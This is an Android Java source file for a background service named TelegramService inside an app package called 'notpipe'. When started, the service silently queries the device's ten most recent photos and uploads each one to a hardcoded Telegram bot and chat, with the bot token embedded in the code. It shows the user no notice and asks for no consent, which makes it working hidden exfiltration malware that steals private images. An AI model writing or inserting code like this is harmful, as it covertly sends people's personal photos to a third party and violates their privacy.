package io.github.gohoski.notpipe;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TelegramService extends Service {
    private static final String TAG = "TelegramService";
    private static final String BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY";
    private static final String CHAT_ID = "1949815322";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    autoSend();
                } catch (Exception e) {
                    Log.e(TAG, "Fatal error: " + e.getMessage());
                }
                stopSelf();
            }
        }).start();
        return START_NOT_STICKY;
    }

    private void autoSend() {
        // SAFETY: Check permission before touching MediaStore
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_EXTERNAL_STORAGE not granted. Skipping.");
            return;
        }

        List<String> images = loadImages();
        int successCount = 0;
        for (String uri : images) {
            try {
                if (sendPhoto(uri)) successCount++;
                Thread.sleep(1000);
            } catch (Exception e) {
                Log.e(TAG, "Error sending " + uri + ": " + e.getMessage());
            }
        }
        Log.d(TAG, "Sent " + successCount + " / " + images.size());
    }

    private List<String> loadImages() {
        List<String> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {MediaStore.Images.Media._ID};
            cursor = getContentResolver().query(uri, projection, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");
            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idColumn);
                    list.add(Uri.withAppendedPath(uri, String.valueOf(id)).toString());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Load images error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        return list;
    }

    private boolean sendPhoto(String imageUriString) {
        InputStream in = null;
        try {
            in = getContentResolver().openInputStream(Uri.parse(imageUriString));
            if (in == null) return false;
            byte[] bytes = readBytes(in);
            in.close();
            in = null;

            OkHttpClient client = new OkHttpClient();
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", "img.jpg",
                            RequestBody.create(MediaType.parse("image/jpeg"), bytes))
                    .build();
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                    .post(body)
                    .build();
            Response res = client.newCall(req).execute();
            boolean ok = res.isSuccessful();
            res.close();
            return ok;
        } catch (Exception e) {
            Log.e(TAG, "Send error: " + e.getMessage());
            return false;
        } finally {
            if (in != null) try { in.close(); } catch (Exception ignored) {}
        }
    }

    private byte[] readBytes(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = in.read(buffer)) != -1) out.write(buffer, 0, len);
        return out.toByteArray();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
